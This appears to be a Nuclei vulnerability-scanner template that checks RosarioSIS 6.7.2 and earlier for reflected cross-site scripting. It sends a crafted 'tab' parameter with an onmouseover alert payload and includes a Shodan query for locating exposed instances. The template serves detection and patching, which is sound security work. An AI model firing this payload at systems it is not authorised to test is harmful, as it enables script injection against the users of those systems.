http:
- matchers:
  - case-insensitive: true
    condition: and
    part: body
    type: word
    words:
    - '" onmouseover=alert(document.domain)'
    - RosarioSIS
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Modules.php?modname=Users/Preferences.php&tab="%20onmouseover=alert(document.domain)%20x="'
id: rosariosis-xss
info:
  author: 0xr2r,jarvis-survives
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'RosarioSIS version 6.7.2 and earlier contains a reflected cross-site
    scripting (XSS) vulnerability in the Preferences module. The ''tab'' parameter
    in Modules.php is not properly sanitized, allowing an attacker to inject arbitrary
    JavaScript code via a crafted URL.

    '
  impact: 'An attacker can execute arbitrary JavaScript in the context of a victim''s
    browser session, potentially leading to session hijacking, credential theft, or
    other malicious actions.

    '
  metadata:
    max-request: 1
    product: rosariosis
    shodan-query: http.html:"RosarioSIS"
    vendor: rosariosis
    verified: true
  name: RosarioSIS 6.7.2 - Cross-Site Scripting
  remediation: 'Update RosarioSIS to the latest version where input validation has
    been improved.

    '
  severity: medium
  tags: rosarios,xss,rosariosis
